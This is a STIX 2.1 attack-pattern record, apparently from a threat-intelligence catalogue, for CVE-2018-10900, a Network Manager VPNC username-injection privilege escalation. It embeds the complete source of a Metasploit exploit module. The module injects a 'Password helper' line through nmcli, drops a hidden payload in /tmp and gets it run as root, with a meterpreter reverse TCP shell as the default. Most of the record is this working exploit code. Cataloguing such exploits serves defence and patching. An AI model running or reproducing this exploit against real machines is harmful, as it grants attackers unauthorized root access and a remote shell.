{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3f72a6d7-c896-4ea7-aaaf-f770b931f068",
    "created": "2024-08-14T16:59:17.301403Z",
    "modified": "2024-08-14T16:59:17.301407Z",
    "name": "Network Manager VPNC Username Privilege Escalation",
    "description": " This module exploits an injection vulnerability in the Network Manager VPNC plugin to gain root privileges.  This module uses a new line injection vulnerability in the configured username for a VPN network connection to inject a `Password helper` configuration directive into the connection configuration.  The specified helper is executed by Network Manager as root when the connection is started.  Network Manager VPNC versions prior to 1.2.6 are vulnerable.  This module has been tested successfully with VPNC versions: 1.2.4-4 on Debian 9.0.0 (x64); and 1.1.93-1 on Ubuntu Linux 16.04.4 (x64).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/network_manager_vpnc_username_priv_esc.rb",
            "external_id": "network_manager_vpnc_username_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-10900"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2018/q3/51"
        },
        {
            "source_name": "reference",
            "url": "https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc"
        },
        {
            "source_name": "reference",
            "url": "https://gitlab.gnome.org/GNOME/NetworkManager-vpnc/commit/07ac18a32b4"
        },
        {
            "source_name": "reference",
            "url": "https://security-tracker.debian.org/tracker/CVE-2018-10900"
        },
        {
            "source_name": "reference",
            "url": "https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-10900.html"
        },
        {
            "source_name": "reference",
            "url": "https://launchpad.net/ubuntu/+source/network-manager-vpnc/0.9.8.6-1ubuntu2.1"
        },
        {
            "source_name": "reference",
            "url": "https://www.debian.org/security/2018/dsa-4253"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1605919"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.novell.com/show_bug.cgi?id=1101147"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Network Manager VPNC Username Privilege Escalation',\n      'Description'    => %q{\n        This module exploits an injection vulnerability in the Network Manager\n        VPNC plugin to gain root privileges.\n\n        This module uses a new line injection vulnerability in the configured\n        username for a VPN network connection to inject a `Password helper`\n        configuration directive into the connection configuration.\n\n        The specified helper is executed by Network Manager as root when the\n        connection is started.\n\n        Network Manager VPNC versions prior to 1.2.6 are vulnerable.\n\n        This module has been tested successfully with VPNC versions:\n        1.2.4-4 on Debian 9.0.0 (x64); and\n        1.1.93-1 on Ubuntu Linux 16.04.4 (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Denis Andzakovic', # Discovery and exploit\n          'bcoles'     # Metasploit\n        ],\n      'DisclosureDate' => '2018-07-26',\n      'References'     =>\n        [\n          ['CVE', '2018-10900'],\n          ['URL', 'https://seclists.org/oss-sec/2018/q3/51'],\n          ['URL', 'https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc'],\n          ['URL', 'https://gitlab.gnome.org/GNOME/NetworkManager-vpnc/commit/07ac18a32b4'],\n          ['URL', 'https://security-tracker.debian.org/tracker/CVE-2018-10900'],\n          ['URL', 'https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-10900.html'],\n          ['URL', 'https://launchpad.net/ubuntu/+source/network-manager-vpnc/0.9.8.6-1ubuntu2.1'],\n          ['URL', 'https://www.debian.org/security/2018/dsa-4253'],\n          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1605919'],\n          ['URL', 'https://bugzilla.novell.com/show_bug.cgi?id=1101147']\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'DefaultOptions' =>\n        {\n          'PAYLOAD'     => 'linux/x86/meterpreter/reverse_tcp',\n          'WfsDelay'    => 10,\n          'PrependFork' => true\n        },\n      'DefaultTarget'  => 0))\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    cmd_exec \"chmod +x '#{path}'\"\n  end\n\n  def check\n    unless command_exists? 'nmcli'\n      vprint_error 'Network Manager nmcli utility is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'nmcli utility is installed'\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    @payload_name = \".#{rand_text_alphanumeric rand(10..15)}\"\n    payload_path = \"#{base_dir}/#{@payload_name}\"\n\n    print_status 'Adding VPN connection...'\n    vpn_data = []\n    vpn_data << '+vpn.data \"IKE DH Group = dh2\"'\n    vpn_data << \"+vpn.data 'IPSec ID = #{rand_text_alphanumeric 5..10}'\"\n    vpn_data << '+vpn.data \"IPSec gateway = 127.0.0.1\"'\n    vpn_data << '+vpn.data \"IPSec secret-flags = 4\"'\n    vpn_data << '+vpn.data \"Local Port = 0\"'\n    vpn_data << '+vpn.data \"NAT Traversal Mode = natt\"'\n    vpn_data << '+vpn.data \"Perfect Forward Secrecy = server\"'\n    vpn_data << '+vpn.data \"Vendor = cisco\"'\n    vpn_data << '+vpn.data \"Xauth password-flags = 4\"'\n    vpn_data << \"+vpn.data \\\"Xauth username = #{rand_text_alphanumeric 5..10}\\nPassword helper #{payload_path}\\\"\"\n    vpn_data << \"+vpn.data 'ipsec-secret-type = #{rand_text_alphanumeric 5..10}'\"\n    vpn_data << \"+vpn.data 'xauth-password-type = #{rand_text_alphanumeric 5..10}'\"\n    res = cmd_exec \"nmcli connection add con-name #{@payload_name} type vpn ifname '*' vpn-type vpnc -- #{vpn_data.join(' ')}\"\n    if res.include? 'Error'\n      fail_with Failure::Unknown, 'Could not create VPN connection'\n    end\n\n    res = cmd_exec 'nmcli connection'\n    unless res.include? @payload_name\n      fail_with Failure::Unknown, 'Could not create VPN connection'\n    end\n\n    print_status 'Uploading payload...'\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    print_status 'Starting VPN connection...'\n    cmd_exec \"nmcli connection up #{@payload_name} & echo \"\n  end\n\n  def cleanup\n    print_status 'Removing VPN connection...'\n    res = cmd_exec \"nmcli connection delete #{@payload_name}\"\n    unless res.include? 'successfully deleted'\n      print_warning \"Could not remove VPN connection #{@payload_name}\"\n    end\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-07-26",
    "x_mitre_platforms": [
        "linux'"
    ]
}